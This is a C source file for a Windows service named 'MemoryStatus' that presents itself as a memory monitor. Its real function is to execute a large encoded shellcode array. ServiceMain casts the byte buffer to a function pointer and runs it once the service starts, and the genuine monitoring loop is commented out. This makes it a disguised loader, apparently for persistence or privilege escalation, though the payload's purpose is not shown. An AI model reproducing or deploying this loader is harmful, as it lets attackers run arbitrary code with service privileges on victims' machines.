#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000
#define LOGFILE "C:\\memstatus.txt"

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void  ServiceMain(int argc, char** argv); 
void  ControlHandler(DWORD request); 
int InitService();

unsigned char buf[] = 
"\xbf\x0c\x18\xba\x65\xda\xdd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\xea\x83\xc2\x04\x31\x7a\x0f\x03\x7a\x03\xfa\x4f\xbe\xcc\x23"
"\xdb\x65\x06\x89\x17\xaf\x57\xcd\xe5\xbf\x88\x1a\xd7\xf1\xdc"
"\x03\xd4\x9b\x39\xb7\x18\x5f\x4b\x5d\x2a\x26\x23\xf2\xa5\x35"
"\x81\x70\xc5\x3c\x5b\x13\x8a\xce\x2c\xae\x9d\xa8\xc8\x5e\x45"
"\xa4\xab\x10\xca\xb6\x46\x2f\x7c\xcb\x01\x10\xec\x8f\x69\x63"
"\xcb\xe7\xec\x84\x00\x0a\x7e\xd0\xa9\x6f\xea\xec\xdf\x6e\x1f"
"\xdd\x9d\x08\x5f\x5b\xf4\x12\x12\xd7\x3b\xb7\x34\xbb\xda\xb1"
"\xf6\x93\x31\x1c\xf6\xe4\x39\x7f\x69\xdc\x6d\x3a\xbe\x01\xbf"
"\x9e\xdc\xf6\x77\x83\x58\x6a\xdc\xe4\x39\x8b\x8c\x44\x49\x97"
"\xcb\x4a\x93\x58\x44\x63\x8d\x7f\x55\xae\x1e\xe5\x8b\x12\x01"
"\xd8\x58\xb4\xee\x4d\xd7\xda\xb5\x01\x1d\x8d\x18\x77\xd5\xb1"
"\xd7\x3b\x03\xfe\x4f\xcd\x36\x76\xdd\xcf\x27\xd0\x4f\x8f\xcb"
"\x89\x82\xb3\x2b\xb2\xe6\x4f\x7b\xe3\x1f\x7b\xd7\x99\xf0\x59"
"\x2c\xde\x71\xa8\xb9\x02\xf3\x2a\x08\x51\xa9\xcb\xdd\x33\x0f"
"\x27\xe7\x16\xdd\x4f\x8e\x9e\xa5\x8f\x70\x88\xeb\x7e\xf8\x4d"
"\xf6\x8b\x95\x20\x7d\xce\x7b\x44\x4c\xfb\xec\xbb\x84\x9b\x42"
"\x1b\x4f\x07\x69\x7f\x90\xcc\xc7\x0e\x38\xd6\xdd\x5a\x02\xf3"
"\x11\x2b\x71\x33\x1c\x19\xab\x3d\x16\x63\x7b\x3e\x2c\x3a\x0b"
"\x43\x65\x7e\x76\x1d\x85\xae\xba\x5b\x74\x5e\x1b\x09\x7e\x1c"
"\xf2\x0f\x4a\xc2\x86\x89\x9a\x0b\xd6\xa8\x17\xc8\x59\xbb\xf3"
"\x3e\x5e\x50\x7f\x0d\x5e\x93\x5e\x4e\xbf\xdb\x2b\x8b\x50\xb9"
"\x7d\x90\xb1\xbd\xfc\x9f\x29\x63\xb0\xd9\xcc\xc7\x72\x70\x19"
"\x03\x16\x9e\x39\x6e\x42\xbc\x5c\xde\xcf\x9f\xa7\xab\xe7\x8b"
"\x40\xf4\x3b\xea\xa5\xb2\x38\xf8\xa2\x59\x5e\x28\xb5\xc1\x87"
"\xf0\x81\x35\x1c\xfb\xc7\x6a\xbf\x1b\x39\xc0\xe9\xa8\xa2\x7f"
"\x4f\x90\x4f\xc2\x09\x63\x59\x05\x4c\x79\x71\x62\xa1\x44\xbb"
"\x62\xf2\x3f\xd6\xa3\xba\x4c\x7f\xd7\xe6\x16\xbf\x20\xe2\xa0"
"\xa0\x9b\x0b\x3a\xca\x8d\xa8\x6a\xca\xbf\x8a\xb7\xa3\x34\x60"
"\x92\xab\x42\x45\x66\x7d\x0b\x5a\x03\x22\xe4\xbd\x25\x1a\xf5"
"\x6b\x0e\x96\xd5\x36\xba\x5e\x0f\x70\x67\x0c\x9f\xf7\x10\xa9"
"\xa4\x9e\x76\x6d\x1d\x73\x47\x19\xc9\xc3\x64\x89\xa2\xff\x1a"
"\x8f\xf5\x84\xcb\x32\x16\xc7\x81\x89\xde\x96\x68\xc8\x2f\xab"
"\xf5\xb3\x69\x1b\x05\xa0\x72\x0b\x82\xed\x4a\xd4\x91\x14\xc0"
"\x85\xce\x87\x1b\xf5\xda\x7c\x5d\xc4\xd5\x22\x25\xad\x2f\x50"
"\x82\xcb\x06\x0f\xb5\x81\xbb\x56\x45\x73\xc9\xa1\xe0\x46\x23"
"\x07\xf9\xa1\xe0\x41\x24\x1b\xcb\xbc\xb4\x8b\x71\x36\x8b\xce"
"\x32\x80\xe7\x57\x0d\x03\x9c\x84\x8d\xe3\x0e\x2b\x5f\x53\xad"
"\x84\x30\xa5\xfc\xcc\xc9\x23\xf5\x7f\x75\xce\xce\x33\x5c\x90"
"\xd2\x32\x27\x31\x6d\x41\x1f\xdc\x35\xda\x41\x05\x75\x35\xc7"
"\xce\xa9\xbc\xed\x1b\x47\xeb\xf0\xcc\x89\x2f\x16\x08\xba\x27"
"\x2a\xbd\x12\xe6\x97\xeb\xed\x30\xf2\xa3\xb0\xc4\xf7\x2f\x84"
"\xed\x8a\x59\xb7\x02\x5a\x48\x9d\xc5\x12\x49\x42\xbb\x0a\x7d"
"\xc3\xc6\x5b\xa4\x52\x86\x69\x3f\x51\x9e\x40\x16\xe6\xe9\x8f"
"\x26\x08\x6a\x13\x4f\xfc\xdf\xe6\xc1\x52\x27\x35\x25\x6b\xb2"
"\x3e\x40\x5a\x18\xd9\xd0\x29\xcf\x88\x6e\x20\x24\x94\x2e\xb0"
"\xd0\x58\xfa\x68\x59\x56\x4b\x80\x42\xbc\xe0\x13\x55\xdc\xe0"
"\x7d\xc8\xee\x1d\x4b\x34\xda\x2f\xaf\x68\x01\x06\xa7\xc9\xaa"
"\xed\xfc\x5d\x2e\xc4\x87\x2f\x26\xb5\xe3\xb0\x9e\x47\x28\xce"
"\x34\xc9\x90\x7d\x06\x86\x70\xde\x1e\x70\x0c\x16\x35\xa9\x7f"
"\x11\xb5\x39\xf0\xfa\x70\x41\xb8\xe5\x71\xa5\xa9\xf2\x37\xe4"
"\x05\x6b\x24\xd5\xbf\xbe\x83\x42\xbe\x08\xa7\x0b\xe5\x2f\x53"
"\xd2\x80\x6b\x9a\x8f\xea\x7c\x31\xe0\x43\x99\xab\xbd\xc6\x1a"
"\x05\xc5\x0a\x17\x18\x1a\x2e\x90\xfd\xa1\x20\x20\x48\xb2\xd5"
"\x02\xef\x4b\xe4\xd3\xf2\x7f\x92\x76\x11\x2f\xd4\x4d\xe5\x32"
"\x2c\x24\xbe\x60\x96\x64\xad\xec\x11\x60\x9b\xca\xb1\xba\xdf"
"\x42\x85\xdd\x20\xe1\x2d\xb4\x56\xc5\x07\x96\x56\x41\x5a\x16"
"\x7e\x7b\x8a\x6e\x5a\xef\xfa\x62\xf5\xdb\xe2\xc6\xb7\xd9\x50"
"\x48\xb6\xb4\x4d\x73\x02\xe5\xf1\x56\x9e\x10\x53\x25\xe4\xeb"
"\x2b\xad\x8a\xe2\x90\xdc\xbe\x6d\x08\xeb\xbe\xaa\xa5\x75\x15"
"\xee\x8d\x4c\x27\x5a\x0a\xa0\xe8\x94\x99\xab\xf9\xde\x9e\xa9"
"\x86\x8f\x17\x81\x5a\xf6\xf1\x14\xea\x15\x3a\xec\x7d\x3d\x09"
"\x54\x65\xb0\x65\x18\x6a\x6f\xb3\x77\x35\xe9\x62\x0f\x9b\x34"
"\x72\xcf\x8b\xde\x11\x2b\x15\xb0\xf5\xbb\x61\x31\x74\xcf\x7e";

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

int WriteToLog(char* str)
{
	FILE* log;
	log = fopen(LOGFILE, "a+");
	if (log == NULL)
		return -1;
	fprintf(log, "%s\n", str);
	fclose(log);
	return 0;
}

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    // Start the control dispatcher thread for our service
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}


void ServiceMain(int argc, char** argv) 
{ 
    int error; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler(
		"MemoryStatus", 
		(LPHANDLER_FUNCTION)ControlHandler); 
    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
    { 
        // Registering Control Handler failed
        return; 
    }  
    // Initialize Service 
    error = InitService(); 
    if (error) 
    {
		// Initialization failed
        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
        ServiceStatus.dwWin32ExitCode      = -1; 
        SetServiceStatus(hStatus, &ServiceStatus); 
        return; 
    } 
    // We report the running status to SCM. 
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
WriteToLog("a\n");	
    exec_shellcode(buf);
    WriteToLog("b\n");	
    //MEMORYSTATUS memory;
    // The worker loop of a service
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
	{
		/*
		char buffer[16];
		GlobalMemoryStatus(&memory);
		sprintf(buffer, "%d", memory.dwAvailPhys);
		int result = WriteToLog(buffer);
		if (result)
		{
			ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
			ServiceStatus.dwWin32ExitCode      = -1; 
			SetServiceStatus(hStatus, &ServiceStatus);
			return;
		}
		*/
		Sleep(SLEEP_TIME);
	}
    return; 
}

 
// Service initialization
int InitService() 
{ 
    
    int result;
    result = WriteToLog("Monitoring started.");
    return(result); 
   
	//exec_shellcode(buf);
//	return 0;
} 

// Control handler function
void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
             WriteToLog("Monitoring stopped.");

            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            WriteToLog("Monitoring stopped.");

            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
 
    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);
 
    return; 
} 

